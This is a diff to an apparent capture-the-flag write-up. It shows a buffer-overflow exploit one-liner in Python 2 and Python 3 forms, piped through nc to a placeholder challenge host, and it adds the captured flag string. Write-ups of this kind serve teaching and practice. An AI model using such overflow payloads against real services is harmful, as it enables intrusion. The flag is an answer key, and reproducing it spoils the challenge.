@@ -71,3 +71,6 @@ python -c 'print "A"*16 + "\x69\xfe\xca\x00" + "\x69\x15\x00\x00"' | nc <ip> <po
 python3 -c 'import sys; sys.stdout.buffer.write(b"A"*16 + b"\x69\xfe\xca\x00" + b"\x69\x15\x00\x00")' | nc <ip> <port>
 ```
 See why we need these two versions of exploit for different python versions in this [stackoverflow answer](https://stackoverflow.com/a/56162216/7737870).
+
+## Flag
+`CTF_BD{PwN_t0_b3_4_W1tch3r}`
